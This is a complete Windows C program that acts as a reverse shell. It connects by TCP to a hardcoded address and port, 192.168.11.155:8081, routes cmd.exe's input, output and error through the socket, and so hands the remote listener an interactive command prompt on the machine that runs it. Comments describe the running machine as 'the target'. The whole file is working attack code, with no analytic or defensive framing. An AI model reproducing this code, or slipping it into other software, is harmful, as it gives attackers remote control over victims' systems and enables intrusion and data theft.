#include <winsock2.h>
#include <stdio.h>
#include <windows.h>
#include <ws2def.h>

#pragma comment(lib, "ws2_32.lib")

int main()
{
	SOCKET shell;
	struct sockaddr_in shell_addr;
	
	WSADATA wsa;
	
	STARTUPINFO si;
	PROCESS_INFORMATION pi;

	char recv_srv[512];
	const int recv_srv_sz = sizeof(recv_srv);

	int connect;
	char ip_addr[] = "192.168.11.155";
	int port = 8081;

	WSAStartup(MAKEWORD(2,2), & wsa);

	// Create a TCP socket
	shell = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 
					  (unsigned int)NULL, (unsigned int)NULL);

	shell_addr.sin_port = htons(port);
	shell_addr.sin_family = AF_INET;
	shell_addr.sin_addr.s_addr = inet_addr(ip_addr);

	// Connect the target to the server.
	connect = WSAConnect(shell, (SOCKADDR*)&shell_addr, sizeof(shell_addr), 
						 NULL, NULL, NULL, NULL);

	// At failing to connect, exit.
	if(connect == SOCKET_ERROR)
	{
		printf("Connection to the target server failed.\n");
		exit(0);
	}
	// At succeed.
	else
	{
		recv(shell, recv_srv, recv_srv_sz, 0);
		memset(&si, 0, sizeof(si));
		si.cb = sizeof(si);
		si.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
		// Pipe standart input/output/error to the socket.
		si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)shell;

		// Spawn Command Prompt.
		CreateProcess(NULL, "cmd.exe", NULL, NULL, 
					  TRUE, 0, NULL, NULL, &si, &pi);
		WaitForSingleObject(pi.hProcess, INFINITE);
		CloseHandle(pi.hProcess);
		CloseHandle(pi.hThread);
		memset(recv_srv, 0, recv_srv_sz);
	}


	return 0;
}